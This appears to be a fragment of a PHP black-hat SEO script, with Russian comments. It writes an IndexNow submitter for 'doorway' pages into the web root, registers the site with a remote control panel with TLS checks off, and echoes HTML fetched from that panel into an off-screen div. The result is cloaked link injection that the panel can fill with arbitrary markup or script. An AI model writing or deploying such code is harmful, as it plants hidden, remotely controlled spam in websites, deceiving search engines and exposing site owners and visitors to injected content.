                header('Content-Type: application/json');
                echo json_encode(['success' => false, 'error' => 'Invalid data']);
                exit;
            }
            
            $doorways = $data['doorways'];
            $host = $_SERVER['HTTP_HOST'];
        
        // Создаем indexnow-key.txt если не существует
        $keyFile = $_SERVER['DOCUMENT_ROOT'] . '/indexnow-key.txt';
        if (!file_exists($keyFile)) {
            $key = bin2hex(random_bytes(16)); // 32 символа
            file_put_contents($keyFile, $key);
            chmod($keyFile, 0644);
        } else {
            $key = trim(file_get_contents($keyFile));
        }
        
        $keyUrl = 'https://' . $host . '/indexnow-key.txt';
        
        // Формируем список URL
        $urlList = [
            'https://' . $host . '/',
            'https://' . $host . '/favicon.ico'
        ];
        
        foreach ($doorways as $doorway) {
            $urlList[] = 'https://' . $host . '/' . $doorway['slug'];
        }
        
        // Генерируем PHP код
        $phpCode = '<?php
// indexnow.php — ТОЧНО ПО ПРИМЕРУ BING (заливай в корень, открой один раз)

$host = $_SERVER[\'HTTP_HOST\'];  // без www., если домен без него
$keyFile = __DIR__ . \'/indexnow-key.txt\';
$keyUrl = \'https://\' . $host . \'/indexnow-key.txt\';  // всегда https

// Генерируем короткий ключ (32 символа, как в примере)
if (!file_exists($keyFile)) {
    $key = bin2hex(random_bytes(16));  // 32 символа
    file_put_contents($keyFile, $key);
    chmod($keyFile, 0644);
    echo "Ключ создан: $key<br>";
} else {
    $key = trim(file_get_contents($keyFile));
}

$urlList = ' . var_export($urlList, true) . ';

$payload = json_encode([
    "host"        => $host,
    "key"         => $key,
    "keyLocation" => $keyUrl,  // строка, как в примере (не массив!)
    "urlList"     => $urlList
], JSON_UNESCAPED_SLASHES);

$ch = curl_init(\'https://api.indexnow.org/IndexNow\');
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $payload,
    CURLOPT_HTTPHEADER     => [\'Content-Type: application/json; charset=utf-8\'],  // точно как в примере
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_USERAGENT      => \'IndexNowBot/1.0\'
]);

$response = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "<hr>";
echo "Ключ: <code>$key</code><br>";
echo "Ссылка: <a href=\'$keyUrl\' target=\'_blank\'>$keyUrl</a><br><br>";

if ($code == 200 || $code == 202) {
    echo "✅ УСПЕХ! Отправлено в Bing (код $code)";
} else {
    echo "❌ Ошибка $code: $response<br>";
    echo "Проверь ссылку на ключ — должна быть 200 OK и просто текст.";
}
?>';
        
            $indexnowFile = $_SERVER['DOCUMENT_ROOT'] . '/indexnow.php';
            
            if (empty($_SERVER['DOCUMENT_ROOT'])) {
                throw new Exception('DOCUMENT_ROOT is empty');
            }
            
            $result = file_put_contents($indexnowFile, $phpCode);
            if ($result === false) {
                throw new Exception('Failed to write indexnow.php to: ' . $indexnowFile);
            }
            
            header('Content-Type: application/json');
            echo json_encode([
                'success' => true,
                'file' => $indexnowFile,
                'key_file' => $keyFile,
                'urls_count' => count($urlList)
            ]);
        } catch (Exception $e) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'error' => $e->getMessage(),
                'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'undefined'
            ]);
        }
        exit;
    
    // Отобразить ссылки
    case 'display':
    default:
        // Загрузка сохраненного конфига
        $config_file = __DIR__ . '/.ttm_config.json';
        
        if (!file_exists($config_file)) {
            // Попробовать загрузить конфиг автоматически
            $panel_api = rtrim(TTM_PANEL_URL, '/') . '/api.php';
            
            // Регистрация сайта
            $ch = curl_init($panel_api);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                'action' => 'register_site',
                'url' => $site_url
            ]));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            curl_exec($ch);
            curl_close($ch);
            
            // Получение конфига
            $ch = curl_init($panel_api);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                'action' => 'get_config',
                'site_id' => $site_id
            ]));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            
            $response = curl_exec($ch);
            curl_close($ch);
            
            if ($response) {
                $data = json_decode($response, true);
                if ($data && isset($data['config'])) {
                    file_put_contents($config_file, json_encode($data['config']));
                }
            }
        }
        
        // Вывод ссылок
        if (file_exists($config_file)) {
            $config = json_decode(file_get_contents($config_file), true);
            
            if (!empty($config)) {
                echo "\n<!-- TTM Links -->\n";
                
                foreach ($config as $item) {
                    $domain = $item['domain'] ?? '';
                    $html = $item['html'] ?? '';
                    
                    if ($domain && $html) {
                        echo '<div style="position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; overflow: hidden;">';
                        echo $html;
                        echo '</div>' . "\n";
                    }
                }
                
                echo "<!-- /TTM Links -->\n";
            }
        }
        
        break;
}
